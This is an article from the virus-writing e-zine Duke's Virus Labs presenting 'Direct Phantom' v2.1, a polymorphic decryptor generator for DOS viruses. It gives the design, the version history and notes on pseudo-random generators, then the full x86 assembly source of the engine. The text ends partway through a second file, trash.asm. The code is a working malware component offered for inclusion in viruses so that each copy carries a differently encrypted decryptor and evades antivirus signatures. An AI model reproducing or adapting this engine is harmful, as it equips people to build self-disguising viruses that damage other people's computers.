- [Duke's Virus Labs #10] - [Page 11] -

Direct Phantom Polymorphic Generator 
(c) by DaemonSerj

От редактора: Автор предоставил для публикации в журнале полные исходники всех
              версий полиморфного генератора DPH. В этой статье представлены
              исходники последней версии. Исходники других версий, а также 
              демонстрационные вирусы и программы, вы найдете в прилагающемся 
              архиве.


			    Direct Phantom
			    ──────────────
	      A includable Simulated Polymorphic Generator
	      ────────────────────────────────────────────


 Mutation Engine. Ну вот и я решил попробовать себя в этой области.
 Уж не знаю как получилось, но думаю на Уровне. Только не знаю на каком:

 [ Использование в расшифровщике взамозаменяемых инструкций и "перемешивание"
   инструкций между собой без изменения алгоритма шифрования,а также расшифровщик
   может использовать различные алгоритмы шифрования вирусного кода.]
   (C) кажется Данилова ?

 Direct Phantom - это подключаемый генератор,моделирующий
 полиморфные расшифровщики. В этой версии DPH 1.0 длинна декриптора
 варьируется от 50 до 100 байт без мусора. Алгоритм шифрования
 составляется из 13 команд на RND(8...16) позиций - от 0.8*10^9 до 6.6*10^17
 комбинаций команд

 Вызов
 ─────

 Нужно заполнить структуру

 (1)
 TARGETPLACE   : SEG:OFFS - место генерения декриптора
 DEST_CODE     : адрес шифруемой области,SEG декриптора
 COUNTER       : длинна области
 LENDECRYPTOR  : длинна декриптора = 0
 RELOFFS       : дополнительное смещение

 (2)
 CALL PHANTOM	   - генерация декриптора

 Создает декриптор в указанном месте
 Если DEST_CODE=FFFFh, то после генерации DEST_CODE = TARGETOFFS+LENDECRYPTOR

 CALL JuNK_DOIT    - шифрование области,освобождение стека


 Моделирование
 ─────────────

 При генерации не используется никаких сжатых масок - нет принципиально разных
 частей ,поэтому разные декрипторы в общем должны рассматриваться как
 декрипторы одного типа:

 ────────────────────────────────────────────────────────────────────────────
 (1)
 InitUsedRegisters:
 BASE	    = 1000h	 В произвольном порядке,
 KEY	    = RND	 с разными регистрами,
 COUNTER    = 3Dh	 и разными способами
 SEGBASE    = ES,DS

 mov	bx,0974F  ; BASE	mov    al,068	  ; KEY
 push	cs	  ; DSBASE	mov    bp,A014	  ; BASE
 pop	ds			mov    bx,cs	  ; DSBASE
 mov	si,cs	  ; ESBASE	mov    ds,bx
 mov	es,si			mov    dx,0003D   ; COUNTER
 mov	al,038	  ; KEY 	push   cs	  ; ESBASE
				pop    es

 (2)
 LoadByteFromCode:  (Present/Abscent)

 Загрузка байта из криптуемого кода в TMP_REG,
 если криптование непосредственно в память,то ничего нет

 mov	ch,es:[bx+78B1] 	------//------

 (3)
 Arithm&Shift[De]Coding:

 Кодирование байта арифметичаскими и логическими командами в REG/MEM
 От 8 до 16 комманд

 Параллельно в стеке создается EncryptionPart состоящий из
 зеркальных комманд в обратном порядке
 При закодировании используется созданный декриптор,но с вызовом EncryptPart

 rol	ch,64			add    ds:[bp][06FEC],00C ; A014+6FEC=1000h
 add	ch,al			add    es:[bp][06FEC],dh
 sub	ah,2E			add    ds:[bp][06FEC],094
 inc	ch			sub    es:[bp][06FEC],06B
 add	ch,FC			add    ds:[bp][06FEC],0A2
 sub	ch,al			inc    es:[bp][06FEC]
 sub	ch,1C			sub    es:[bp][06FEC],dl  ; С счетчиком
 neg	ch			sub    ds:[bp][06FEC],al  ; С ключем
 rol	ch,1			add    es:[bp][06FEC],al
				neg    es:[bp][06FEC]
				not    es:[bp][06FEC]
				inc    ds:[bp][06FEC]
				rol    ds:[bp][06FEC],024
				add    es:[bp][06FEC],066
				rol    es:[bp][06FEC],1

 (4)
 SaveByteFromCode:  (Present/Abscent)

 Сохранение байта в криптуемый код из TMP_REG,
 если криптование непосредственно в память,то ничего нет

 mov	es:[bx+78B1],ch 	------//------

 (5)
 ChangeCnt,Base&TestLimit

 Продвижение Базы  -  ADD/SUB,SUB/ADD,INC

 Уменьшение счетчика цикла  -  DEC
 (если таковой существует)

 Проверка предела  -  CMP or None
 Результат в ZF
 После проверки предела не присутствует мусор

 sub	bx,4C			inc    bp
 add	bx,4D			dec    dx
 cmp	bx,978C

 (5a)
 ChangeKey (не реализовано)
 Изменение ключа всеми доступными способами

 (6)
 JumpIfNotAll

 Цикл по признаку ZF  -  JNE Rel8 , JNE Rel16
 ────────────────────────────────────────────────────────────────────────────

 HISTORY
 ───────

 Версия 1.0 beta

 + Не найдено ошибок. У-рр-а !!!
 + Возможность использования DEST_CODE = FFFFh
 - Нет мусора - уже написан,но неоптимизен,TRCHAIN = RET
 - Нет базирования PHANTOM (и не будет)
 - Нет антиэвристики (и не будет)

 Версия 2.0

 + Сделан генератор мусора включающий в себя весь какой только можно мусор
   с любыми режимами адресации (см. TRCOMM.TXT ). Круче SMEG !
   Включает мусорные подпрограммы и вызовы их. Все CALL'ы адресуются назад.


 - Имеется генерация словного мусора адресующегося в память типа mov ax,[bx]
   Отсюда возможна экзотическая ошибка "заворачивание сегмента"
   Это когда BX=0FFFFh,и при mov ax,[bx] вылетает Exeption 12:Invalid opcode
   Вообще сначала я думал что такой глюк будет встречаться крайне редко,
   но к моему огорчению результаты тестов показали обратное - 1/15.
   Видимо придется оставить только байтовую адресацию в память.А жаль.

 - Крайне принципиальная ошибка.
   Мусорные CALL'ы формируются из 4 offset'ной очереди на предшествующие SUB'ы
   в любом месте программы.Но слежение за регистрами осуществляется линейно
   по ходу формирования декриптора.
   Может возникнуть ситуация когда SUB'рутина мусором изменяет нужный регитср,
   когда в том месте откуда она вызывалась этого уже делать нельзя.
   Но когда генерилась процедура этот регистр был еще свободным для мусора

 Версия 2.1

 + Исправлены CALL'ы :
   Теперь адресация CALL'ов сделана только на впередстоящие SUB'рутины.
   То есть в SUB'ах нужные регистры уже учтены.
   Для пользования FREEREG сделан MaskCALLRequest - запрещает генерацию CALL'ов
 + Возможны вложенные CALL'ы : в одном экземпляре у меня наблюлось 8 вложений.
 - Лишняя сотня байтов . Итого DirectPhantom v2.1 = 2045 байт.


О случайных числах
--------------------

Обычно нужен генеpатоp _псевдослучайных_ чисел, котоpый выдает pавномеpно
pаспpеделенные числа в диапазоне [0,1) с некотоpым числом pазpядов (или, что
то же самое, целые числа 0..2**n-1). Есть некотоpая статическая пеpеменная для
хpанения состояния, следующее число генеpится по _очень_ пpостой фоpмуле по
этому состоянию, после чего состояние модифициpуется. Часто состояние с этим
числом пpосто совпадает. В действительности последовательность является
циклической (битиков-то конечное количество), но с большим пеpиодом. Чтобы пpи
запуске пpогpаммы эта последовательность начиналась с тpудно пpедсказуемого
места, состояние инициализиpуется хитpым способом, напpимеp, беpется текущее
вpемя (обычно pазpядов в нем много, и не все они одинаково "случайные", поэтому
его еще немного пpеобpазуют).

[...]

Hа 16-pазpядных целых должны получаться все 65536 неповтоpяющихся чисел.
А что, наpод Кнута совсем читать не хочет?
Вот pецепт (из "выводов" к pазделу о генеpатоpах псевдослучайных чисел):

"наилучший" и "пpостейший" датчик случайных чисел получается по фоpмуле

X(I+1)=(a*X(I)+c) mod m

Умножение должно быть точным (без окpугления и тому подобного).

   Пpи выбоpе X(0),a,c и m необходимо соблюдать некотоpые пpавила и
использовать случайные числа осмысленно, pуководствуясь следующими пpинципами.

i) Число X(0) может быть пpоизвольным.

ii) Число m должно быть велико. Удобно выбиpать его pавным pазмеpу слова
вычислительной машины (Кнут явно имеет в виду 2**k, где k - pазpядность слова
или pазpядность слова за вычетом знакового pазpяда - пpим. Го), поскольку пpи
этом эффективно вычисляется (a*X+c) mod m.

iii) Если m пpедставляет собой степень двойки (т.е. если используется машина,
pаботающая в двоичной системе счисления), выбеpите a таким, чтобы a mod 8 = 5.
Пpи таком выбоpе величины a, пpи условии, что c выбиpается описанным ниже
способом, гаpантиpуется, что датчик случайных чисел даст все m возможных
pазличных значений X, пpежде чем они начнут повтоpяться и, кpоме того,
гаpантиpуется  высокая "мощность".

iv) Множитель a должен пpевосходить величину Sqrt(m), желательно, чтобы он был
больше m/100, но меньше m-Sqrt(m). Последовательность pазpядов в двоичном
пpедставлении a не должна иметь пpостого, pегуляpного вида. Высказанных
сообpажений обычно бывает достаточно, но если датчик случайных чисел
используется интенсивно, множитель a, кpоме того, следует выбиpать так, чтобы
удовлетвоpялся "спектpальный тест".

v) Постоянная c должна быть pавна нечетному числу. Желательно выбиpать c таким
обpазом, чтобы отношение c/m было бы пpиблизительно pавно величине
0.2113248654051871.

vi) Менее значимые pазpяды X не очень хоpоши, лучше pассматpивать X как дpобь
X/m в интеpвале между 0 и 1.

   За обоснованием, pазъяснением непонятных слов, методами пpовеpки датчиков -
пожалуйста, к Кнуту.

 TZ> Hу а начальную инициализацию фоpмулы (Hапp. X(0) или I0) делаешь в
 TZ> зависимости от текущего вpемени.

   Это точно, только хоpошо бы сpазу кpутануть генеpатоp хоть pазок, чтобы
pазбpос пеpвых значений не так кучковался пpи последовательных запусках.

RND слово

m=65535 - слово машины
a=36173 - mod(a)=101b , a > 655.35 , a < 65535 - 255
c=13849 - c/m = 0.211322

RND байт

m=256
a=[2.56,240]=101
c=54



===== begin phantom.asm =====
CntF		equ	00000001b   ; счетчик / предел
RMF		equ	00000010b   ; регистр / память
UcF		equ	00000100b   ; неизвестное место кода
JRQ		equ	00001000b   ; Запрос на Jxx Imm8
PRQ		equ	00010000b   ; Запрос на Push/Pop
SRQ		equ	00100000b   ; Запрос на Subroutine
CRQ		equ	01000000b   ; Запрос на CALL
FCR		equ	10000000b   ; Бит завершения CALL'ов
MSR		equ	100000000b  ; Бит запрещения SUB & CALL

REG_AX		equ	0	    ; Регистры по порядку
REG_CX		equ	1
REG_DX		equ	2
REG_BX		equ	3
REG_SP		equ	4
REG_BP		equ	5
REG_SI		equ	6
REG_DI		equ	7

PhantomID	db	'Direct Phantom v2.1',0
RND_SEED	db	55h
				     ; 7		     0
REG_USED	db	00010000b    ; DI SI BP SP BX DX CX AX
				     ; 7		     0
HALF_USED	db	00000000b    ; BH DH CH AH BL DL CL AL

PH_FLAGS	db	0      ; флаги
		db	0      ; Расширенные флаги

BASE_REG	db	0      ; базовый регистр
KEY_REG 	db	0      ; ключ
BASE_RM 	db	0      ; адресация через базу в память
BASE_TR 	dw	0      ; база - init
EncryptPart	dw	0      ; адрес EP в стеке

INITTAB 	dw	offset INITBASEOFFS   ; Таблица инициализации
		dw	offset INITBASESEG
		dw	offset INITKEY
		dw	offset INITCOUNTER
		dw	offset INITBASESEG
INITFLAGS	db	0
;-----------------------------------------
ImmF		equ	10000000b
KeyF		equ	01000000b

		; COP , ModeR/M , Flags & Зеркальная команда

CRYPTTAB	db	11000000b,11000000b,ImmF+3   ; ROL REG/MEM,IMM8
		db	11000000b,11001000b,ImmF+0   ; ROR REG/MEM,IMM8
		db	10000000b,11000000b,ImmF+9   ; ADD REG/MEM,imm8
		db	10000000b,11101000b,ImmF+6   ; SUB REG/MEM,imm8
		db	10000000b,11110000b,ImmF+12  ; XOR reg/mem,imm8

		db	11110110b,11010000b,15	     ; NOT reg/mem
		db	11110110b,11011000b,18	     ; NEG reg/mem
		db	11111110b,11000000b,24	     ; INC reg/mem
		db	11111110b,11001000b,21	     ; DEC reg/mem
		db	11010000b,11000000b,30	     ; ROL REG/MEM,1
		db	11010000b,11001000b,27	     ; ROR REG/MEM,1

		db	00000000b,11000000b,KeyF+36  ; ADD reg/mem,KEY
		db	00101000b,11000000b,KeyF+33  ; SUB reg/mem,KEY
		db	00110000b,11000000b,KeyF+39  ; XOR reg/mem,KEY
ENDCRCMD	equ	$

;-----------------------------------------------------------------------------
RND		proc
; dl = RND(0..dl)  получить случайный байт

		push	ax
		or	dl,dl		     ; RND(0..0)=0
		jz	FinishRND
		push	dx

		inc	dl
		jnz	NormLimit
		dec	dl
NormLimit:
		mov	ax,0100h	    ; размер единичного отрезка
		div	dl
		not	ah
		push	ax

		in	al,40h		 ; RND байт
		mul	[RND_SEED]
		add	ax,13849
		mov	[RND_SEED],al

		pop	dx	    ; Биективно отобразим RND байт в пределы
		cmp	al,dh
		jbe	NormByte
		mov	al,dh
NormByte:
		xor	ah,ah
		div	dl
		pop	dx
		mov	dl,al
FinishRND:
		pop	ax
		ret
RND		endp
;-------------------
DROPCOIN	proc
; подбрасывание монетки - результат в ZF
		push	dx
		mov	dl,1
		call	RND
		and	dl,1
		pop	dx
		ret
DROPCOIN	endp
;-------------------
GETNUM		proc
; Exit - RND = 0...dl , al = mask
		call	RND
		mov	cl,dl
		mov	al,1
		shl	al,cl
		ret
GETNUM		endp
;-------------------
GETFREEREG	proc
; CF=0 - регистр
; CF=1 - полурегистр
; Возвращает свободный регистр в DL
		pushf
		push	ax
		push	cx
		jc	HalfReg
NextReg:
		mov	dl,7
		call	GETNUM
		test	[REG_USED],al
		jnz	NextReg

		or	[REG_USED],al	 ; Пометим как занятый

		mov	cl,al		 ; биты 3...0 в 7...0
		shl	cl,4		 ; для HALF_USED
		and	al,0Fh
		or	al,cl
		or	[HALF_USED],al	 ; Пометим

		jmp	RegDone
HalfReg:
		mov	dl,7
		call	GETNUM
		test	[HALF_USED],al
		jnz	HalfReg

		or	[HALF_USED],al	; Пометим как занятый
		cmp	al,0Fh
		jb	DontRotate
		shr	al,4		; Пометим как занятый и в REG_USED
DontRotate:
		or	[REG_USED],al
RegDone:	pop	cx
		pop	ax
		popf
		ret
GETFREEREG	endp
;-------------------
FREEREG 	proc
; Обьвляет регистр свободным
		push	ax
		pushf
		mov	al,1
		mov	cl,dl
		shl	al,cl

		mov	cl,al
		not	cl

		mov	ah,al		   ; биты 3...0 в 7...0
		shl	ah,4		   ; для HALF_USED
		and	al,0Fh
		or	ah,al

		popf
		jc	FreeHalfReg

		not	ah		   ; Освобождаем регистр и
		and	[REG_USED],cl	   ; два соответствующих полурегистра
		and	[HALF_USED],ah
		jmp	EndFreeReg
FreeHalfReg:
		and	[HALF_USED],cl	   ; Если второй полурегистр свободен
		and	ah,[HALF_USED]	   ; то освобождаем регистр
		jnz	EndFreeReg
		not	al
		and	[REG_USED],al
EndFreeReg:
		pop	ax
		ret
FREEREG 	endp
;-------------------
MAKERM		proc
; Исходя из индексного регистра в DL делает
; соответствующую адресацию впамять
		push	ax
		mov	al,00011011b
		cmp	dl,REG_BX	 ; BX
		jz	RM
		shr	al,2
		cmp	dl,REG_BP	 ; BP
		jz	RM
		shr	al,2
		cmp	dl,REG_DI	 ; DI
		jz	RM

		shr	al,2		 ; SI
RM:		and	al,00000011b
		or	al,00000100b	 ; DONE
		mov	[BASE_RM],al
		pop	ax
		ret
MAKERM		endp
;-------------------
SavePRFX	proc

		cmp	[BASE_REG],REG_BP    ; Префикс только перед [BP]
		jne	PRFX_OUT

		push	cx
		in	al,40h
		mov	cl,al

		mov	al,00100110b
RNDPRFX:	xor	al,00011000b   ; ES или DS
		loop	RNDPRFX

		stosb		       ; DONE
		pop	cx
PRFX_OUT:
		ret
SavePRFX	endp
;-------------------
INITBASEOFFS	proc
; базирует регистр на криптуемый код
; возможно неизвестное смещение - код сразу за декриптором

GetBase:
		clc
		call	GETFREEREG	  ; получили базу

		mov	al,1
		mov	cl,dl
		shl	al,cl
		and	al,11101000b ;маска индексных регистров : SI,DI,BP,BX
		jnz	BASEOK

		clc		     ;только индексные
		call	FREEREG
		jmp	GetBase
BASEOK:
		mov	[BASE_REG],dl	  ; запомним
		call	MAKERM		  ; сделаем r/m байт

		mov	al,10111000b	  ; mov reg,imm16
		or	al,dl
		stosb

		mov	dx,[DEST_CODE]	; Смещение криптуемого кода
		test	[PH_FLAGS],UcF	; еще известно - доделаем потом
		jz	make_base	; DESTCODE будет сразу за декриптором

		xor	dx,dx		; пока база 0
		mov	word ptr [PHTEMP_BASE],di
make_base:
		in	al,40h	 ; Словное дополнительное TRASH смещение
		mov	ah,al
		in	al,40h

		xchg	ax,dx	 ; INITBASE = BASE - TRASH
		sub	ax,dx
		mov	[BASE_TR],dx
		stosw
		call	TRCHAIN
		ret
INITBASEOFFS	endp
;-------------------
INITBASESEG	proc
; Установим ES,DS = CS
		mov	dh,00011000b	   ; ES или DS
DEST_SREG	equ	$ - 1

		mov	dl,00001000b	   ; CS
		call	MAKESEGREG
		xor	byte ptr [DEST_SREG],00011000b

		ret
INITBASESEG	endp
;-------------------
MAKESEGREG	proc
; dh - destination sreg      Моделируется : PUHS SRC  или  MOV REG,SRC
; dl - source sreg			    POP DEST	   MOV DEST,REG

		call	DROPCOIN    ; подбросим монетку
		jz	SECONDPART

		mov	al,00000110b	  ; PUSH SREG
		or	al,dl		  ; + SOURCE
		stosb

		call	TRCHAIN

		xor	al,dl		  ; сбросим SOURCE
		or	al,1		  ; + POP
		or	al,dh		  ; + DESTINATION
		stosb
		jmp	DoneSreg
SECONDPART:
		mov	ax,1100000010001100B	  ; MOV REG,SREG
		or	ah,dl
		clc
		mov	cl,dl
		call	GETFREEREG
		xchg	cl,dl
		or	ah,cl	      ; промежуточный регистр
		stosw

; Нельзя делать CALL мусор, так как вызванная ниже процедура может
; портить уже освобожденный здесь промежуточный регистр

		or	word ptr [PH_FLAGS],MSR
		call	TRCHAIN
		xor	word ptr [PH_FLAGS],MSR

		xor	ah,dl	      ; сбросим SOURCE
		or	al,2	      ; Set Dbit - MOV SREG,AX
		or	ah,dh	      ; + DESTINATION
		or	ah,cl	      ; + промежуточный регистр
		stosw

		mov	dl,cl	      ; свободен для дальнейшего
		clc
		call	FREEREG
DoneSreg:
		call	TRCHAIN
		ret
MAKESEGREG	endp
;-------------------
INITKEY 	proc
		in	al,40h		; ключ
		mov	ah,al
		mov	al,10110000b	; MOV REG,IMM8
		stc
		call	GETFREEREG	; сам регистр
		mov	[KEY_REG],dl	; он нам еще будет нужен
		or	al,dl
		stosw
		call	TRCHAIN
		ret
INITKEY 	endp
;-------------------
INITCOUNTER	proc
		call	DROPCOIN	; ограничивание криптуемого кода -
		jz	CodeLimit	; сравнивание с пределом

		clc			; сделаем счетчик
		call	GETFREEREG
		mov	byte ptr [CNT_REG],dl
		mov	al,10111000b
		or	al,dl
		stosb

		mov	ax,[counter]
		stosw
		or	[PH_FLAGS],CntF    ; ограничивание по счетчику
		call	TRCHAIN 	   ; DEC CNT
CodeLimit:
		xor	[PH_FLAGS],CntF    ; ограничивание по пределу
		ret			   ; CMP BASE,DESTCODE+COUNTER
INITCOUNTER	endp
;-------------------
INITPHANTOM	proc
;Инициализация всех параметров в произвольном порядке

		call	DROPCOIN      ;криптование REG/MEM ?
		jz	CRYPTTYPE

		or	[PH_FLAGS],RMF	  ; криптование непосредственно
					  ; в память
CRYPTTYPE:
		cmp	[DEST_CODE],0FFFFh   ; DEST_CODE неизвестно
		jne	fixed		     ; будет сразу за декриптором

		or	[PH_FLAGS],UcF	     ; установим Unknown Code Flag
fixed:

; Последовательный RND вызов процедур настройки параметров

		mov	dl,4
NextProc:
		push	dx
		call	GETNUM
		shl	dl,1
		movzx	bx,dl	 ; index в таблице адресов процедур

		test	[INITFLAGS],al
		jnz	ThisProcIsDone	  ; Уже была выполнена

		or	[INITFLAGS],al		  ; Пометим
		call	[BX+offset INITTAB]	  ; Выполним
		pop	dx
		jmp	NextProc
ThisProcIsDone:
		cmp	[INITFLAGS],1Fh   ; все процедуры выполнены ?
		pop	dx
		jne	NextProc
		ret
INITPHANTOM	endp
;-------------------
ENCRYPT 	proc
; Генерирует команды загрузки/сохранения байта из криптуемого кода,если RmF=0
; Генерирует последовательность расшифровывающих команд - DecryptPart ,
; параллельно в стеке генерится зеркальная последовательность - EncryptPart
; для последующей зашифровки кода

		pop	word ptr [CryptExit]

		mov	word ptr [PH_LABEL],di	 ; метка дла перехода
		call	TRCHAIN 		 ; разбавим дерьмом

		test	[PH_FLAGS],RMF	; не надо загрузки байта в TMP_REG
		jnz	MEMCRYPT

; Моделируем Загрузку байта из кода
		stc
		call	GETFREEREG
		mov	byte ptr [TMP_REG],dl

		call	SavePRFX	     ; Если нужно сделаем префикс

					     ; для команды сохранения байта

		mov	word ptr [LoadSaveCMD],di


		mov	al,10001010b	   ; MOV REG,R/M
		stosb

		mov	al,10000000b	   ; байт ModeR/M

		shl	dl,3		   ; + TMP_REG
		or	al,dl		   ; + адресацию в память
		or	al,[BASE_RM]
		stosb

		mov	ax,[BASE_TR] ; + мусор - REALBASE = INIT + TRASH
		stosw
		call	TRCHAIN
MEMCRYPT:
; Генерим EN/DEcryptionPart
		mov	word ptr [CRYPTLAB],di
		; В [CRYPTLAB] будет помещен JMP в DecryptPart

		call	RMTRASH
		call	SimplyTRASH	; Поверьте так надо...
		call	RMTRASH

		mov	si,offset CRYPTTAB

		mov	dl,8	  ; криптующих команд : RND (8...16)
		call	RND
		add	dl,8
		mov	cl,dl
		xor	ch,ch
					    ; STKFRM - размер DecPart в стеке
		mov	word ptr [STKFRM],6 ; Пока только дальний JMP

		push	es	; Seg:Offs Decryptor'a
		push	ax
		mov	word ptr [OffsFARJump],sp  ; Для смещения - оно
						   ; еще не известно

		mov	ax,0EA90h     ; Far Jump обратно в декриптор
		push	ax

MAKE_CRYPT_CMD:

		mov	dl,(ENDCRCMD-CRYPTTAB)/3-1
		call	RND
		xchg	al,dl
		mov	dl,3	     ; индекс команды в таблице
		mul	dl
		mov	bx,ax

		mov	ax,9090h     ; Stack Frame for THIS command
		push	ax
		push	ax
		push	ax
		add	word ptr [STKFRM],6  ; увеличим
		mov	bp,sp

		test	[PH_FLAGS],RMF	; Нужен префикс ? (если в память)
		jz	DoNotPRFX
		call	SAVEPRFX
		mov	byte ptr [bp],26h     ; И в stack frame
		inc	bp
DoNotPRFX:
		mov	ax,[si+bx]
		stosb			; КОП
		mov	al,ah		; ModeR/M байт

		mov	ah,bl
		mov	bl,[si+bx+2]
		and	bl,00111111b
		mov	dx,[si+bx]	; код зеркальной команды
		mov	bl,ah

		mov	[bp],dl
		inc	bp

		test	byte ptr [si+bx+2],KeyF ; не добавлять ключ
		jz	DontAddKEY

		mov	dl,[KEY_REG]	; + KEY_REG
		shl	dl,3
		or	al,dl		; This COP
		or	dh,dl		; COP в stack frame
DontAddKEY:
; добaвление памяти или TMP_REG'a

		mov	ah,00h
TMP_REG 	equ	$ - 1
		test	[PH_FLAGS],RMF
		pushf
		jz	AddTMP

		mov	ah,[BASE_RM]
		and	al,10111111b   ; MODE = [mem+imm16]
		and	dh,10111111b
AddTMP:
		or	al,ah	       ; COP's Done
		or	dh,ah
		stosb
		mov	[bp],dh
		inc	bp

		popf
		jz	AddIMM8

		mov	ax,[BASE_TR]   ; + мусор (как при загрузке байта)
		stosw
		mov   [bp],ax
		inc   bp
		inc   bp
AddIMM8:
		test	byte ptr [si+bx+2],ImmF
		jz	CRCMD_DONE		   ; Immediate8  не надо

		in	al,40h
		stosb
		mov	[bp],al   ; B stack frame

CRCMD_DONE:
		call	TRCHAIN 	; Следующую команду
		dec	cx
		jne	MAKE_CRYPT_CMD

		mov	bp,0000h   ; выход из stackframe в DECRYPTOR
OffsFARJump	equ	$ - 2
		mov	[bp],di

		mov	[EncryptPart],sp

		test	[PH_FLAGS],RMF
		jnz	DontMakeSaveCMD

		call	SAVEPRFX      ; Сделаем команду сохранения байта -
		mov	bx,0000h      ; возьмем команду загрузки и
LoadSaveCMD	equ	$ - 2	      ; сбросим Direction bit
		mov	eax,es:[bx]
		and	al,11111101b

		stosd		      ; Done

		call	TRCHAIN
DontMakeSaveCMD:
		mov	ax,0000h
CryptExit	equ	$ - 2

		push	ax
		ret
ENCRYPT 	endp
;-------------------
CHANGECNT	proc

		call	DROPCOIN
		jz	second

		mov	al,01000000b
		or	al,[BASE_REG]
		stosb
		jmp	ChangeEndCrypt
second:
		mov	ax,1100000010000011b	; ADD/SUB BASE,imm8
		or	ah,[BASE_REG]

		call	DROPCOIN
		jz	met

		xor	byte ptr [IncDec],00001000b
		or	ah,00101000b
met:
		stosw
		push	ax
		in	al,40h
		and	al,3Fh
		mov	dl,al
		stosb
		pop	ax

		call	TRCHAIN

		dec	dl
IncDec		equ	$ - 1
		xor	ah,00101000b
		stosw
		mov	al,dl
		stosb

		or	byte ptr [IncDec],00001000b
ChangeEndCrypt:
		call	TRCHAIN

		test	[PH_FLAGS],CntF
		jnz	Limit_

		mov	al,01001000b
		or	al,00h
CNT_REG 	equ	$ - 1
		stosb
		jmp   endchange
Limit_:
		mov	ax,1111100010000001b
		or	ah,[BASE_REG]
		stosw
		mov	ax,[DEST_CODE]
		inc	ax
		test	[PH_FLAGS],UcF
		jnz	unk
		dec	ax
unk:
		sub	ax,[BASE_TR]
		mov	word ptr [PHTEMP_CNT],di
		add	ax,[COUNTER]
		stosw
endchange:
		ret
CHANGECNT	endp
;-------------------
MAKEJNE 	proc

		mov	dx,di
		inc	dx
		inc	dx
		sub	dx,1234h
PH_LABEL	equ	$ - 2
		cmp	dx,80h		; Не выходит ли за пределы 128 байт
		jb	REL8bit
		inc	dx
		inc	dx
		mov	ax,850Fh	; JNE Rel16
		stosw
		xchg	ax,dx		; и смещение
		neg	ax
		stosw
		jmp	EndJNE
REL8bit:
		mov	al,75h		; сделаем короткий
		stosb
		xchg	al,dl
		neg	al
		stosb
EndJNE:
		ret
MAKEJNE 	endp
;-----------------------------------------------------------------------------
PHANTOM 	proc

; Структура заполняемая для вызова PHANTOM
;	 RELOFFS	  - TARGETOFFS + RELOFFS = реальное место выполнения
;	 DEST_CODE	  - адрес криптуемого кода
;	 COUNTER	  - длинна кода
;	 TARGETPLACE	  - место для декриптора
;	 LENDECRYPTOR	  - длинна декриптора (генерится)

; Инициализация
		pop	word ptr [EXPHANTOM]
		cli

		xor	al,al
		mov	[PH_FLAGS],al
		mov	[INITFLAGS],al
		mov	[HALF_USED],al
		mov	[REG_USED],00010000b

		movzx	eax,al
		mov	dword ptr [SUBOFFS],eax
		mov	dword ptr [SUBOFFS+4],eax

		les	di,[TARGETPLACE]    ; Куда будем генерить
		cld

		call	TRCHAIN

		call	INITPHANTOM	; Part 1 - инициализация регистров
		call	ENCRYPT 	; Part 2 - GEN EN/DEcryptionPart
		call	CHANGECNT	; Part 3 - изменение счетчиков
		call	MAKEJNE 	; Part 4 - циклический переход

		mov	word ptr [ENDLOOP],di
		; Для зашифровывания используется тот же декриптор -
		; DI - адрес для временного RETF

		call	TRCHAIN
		call	FinishTR

		test	[PH_FLAGS],UcF
		jz	DONTADDOFFS
		mov	[DEST_CODE],di	    ; делаем Relative DEST_CODE
		call	ADDREALPLACE
DONTADDOFFS:
		mov	ax,di
		sub	ax,word ptr [TARGETPLACE]
		mov	[LENDECRYPTOR],ax   ; Длинна декриптора

		sti
		mov	ax,0000h
EXPHANTOM	equ	$ - 2
		push	ax
		ret
PHANTOM 	endp
;-------------------
JuNK_DOIT	proc
; Зашифровка кода и удаление EncryptionPart
		cli
		pop	word ptr [EXJUNK]

		push	es
		pop	ds

		mov	si,0000h   ; Сделаем временный возврат
ENDLOOP 	equ	$ - 2
		mov	dh,0CBh
		xchg	[si],dh

		mov	bx,0000h
CRYPTLAB	equ	$ - 2
				   ; Сделаем jmp SS:EncryptChain
		mov	dl,0EAh
		mov	ax,ss	   ; Сегмент стека
		rol	eax,16
		mov	ax,cs:[EncryptPart]   ; Смещение

		xchg	[bx],dl
		xchg	[bx+1],eax

		push	si
		push	bx
		push	dx
		push	eax

		call	cs:[TARGETPLACE]

		pop	eax
		pop	dx
		pop	bx
		pop	si

		mov	[si],dh      ; восстановим все что поменяли
		mov	[bx],dl
		mov	[bx+1],eax

		push	cs
		pop	ds

		mov	di,[RELOFFS]   ; Сделаем Реальное смещение
		call	ADDREALPLACE

		push	ss
		push	ss
		pop	es
		pop	ds

		mov	dx,0000h
StkFrm		equ	$ - 2

		mov	di,sp
		mov	si,sp
		mov	cx,cs:[EncryptPart]

		cld
		add	di,dx
		sub	cx,sp
Move:
		jcxz	EndMoveStk
		movsb
		dec	cx
		jmp	Move
EndMoveStk:
		add	sp,dx

		push	cs
		push	cs
		pop	es
		pop	ds

		sti
		mov	ax,0000h
EXJUNK		equ	$ - 2
		push	ax
		ret
JuNK_DOIT	endp
;-------------------
AddRealPLACE	proc
		mov	bx,1234h
PHTEMP_BASE	equ	$ - 2
		add	es:[bx],di

		test	[PH_FLAGS],CntF
		jz	DontLimit

		mov	bx,1234h
PHTEMP_CNT	equ	$ - 2
		add	es:[bx],di
DontLimit:
		ret
AddRealPLACE	endp
===== end   phantom.asm =====

===== begin trash.asm =====
;  Формат слова статуса для REG/MEM trash
;
;  WD = 00 - W нет D нет		     0,1 Wbit & Dbit
;	01 - W=0,1 D нет
;	10 - W=0,1 D=1
;	11 - W=0,1 D=0,1
;
;  TR = 0 - не тестировать поле REG	     2	 TestREG
;	1 - тестировать поле REG
;
;					     3	 TestREG/MEM
;  TRM = 0 - не тестить поле REG/MEM
;	 1 - тестить на регистр
;
;  MemOnly = 0 - произвольно		     4	 MemOnly
;	     1 - только в память
;
;  PLCMD = 00 - нет дополнительной команды   5,6 PLaceCoMmanD
;	   01 - в КОП'e 			 местоположение
;	   10 - в ModeRM
;
;  ImmF = 0 - нет дополнительного операнда    7   Immediate
;	  1 - есть дополнительный операнд
;
;					     8,9,10
;					     дополнительная команда
;					     11,12,13
;					     дополнительный КОП
;
;  KillAD = 0 - не портит AX и DX	     14  KillAX,DX
;	    1 - портит AX и DX

Wbit		equ	0
WDbit		equ	00000011b
TR		equ	00000100b
TRM		equ	00001000b
MemOnly 	equ	00010000b
CMDinCOP	equ	00100000b
CMDinRM 	equ	01000000b
ImmF		equ	10000000b
;		High Byte
XtraCMD 	equ	00000111b
XtraCOP 	equ	00111000b
KillAD		equ	01000000b

RMTAB		equ	$

db	10001010b,10b+TR,0			; MOV REG,REG/MEM
db	10000110b,01b+TR+TRM,0			; XCHG REG,REG
db	10001101b,00b+TR+MemOnly,0		; LEA REG,MEM
db	00000010b,10b+TR+CMDinCOP,111b		; ARCMD REG,REG/MEM
